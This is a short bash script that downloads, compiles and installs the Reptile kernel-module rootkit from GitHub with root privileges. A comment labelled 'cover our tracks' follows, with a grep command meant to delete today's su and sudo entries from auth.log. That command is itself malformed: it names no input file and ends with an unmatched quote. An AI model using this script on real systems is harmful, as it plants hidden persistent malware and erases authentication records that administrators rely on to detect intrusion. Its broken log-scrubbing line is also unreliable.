#!/bin/bash

sudo apt install build-essential libncurses-dev linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
make config
make
sudo make install

# cover our tracks (both for su and sudo)
grep -a -v "`date | awk '{print $3, $2}'`.*su" > auth2.log && mv auth2.log auth.log'

exit
